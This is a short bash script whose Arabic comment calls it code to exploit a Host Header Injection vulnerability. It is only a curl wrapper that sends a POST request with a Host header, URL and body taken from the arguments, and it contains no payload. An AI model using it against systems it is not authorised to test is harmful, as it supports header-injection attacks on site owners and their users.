#!/bin/bash
# كود لاستغلال ثغرة Host Header Injection
curl -s -X POST -H "Host: $1" -d "$3" "$2"
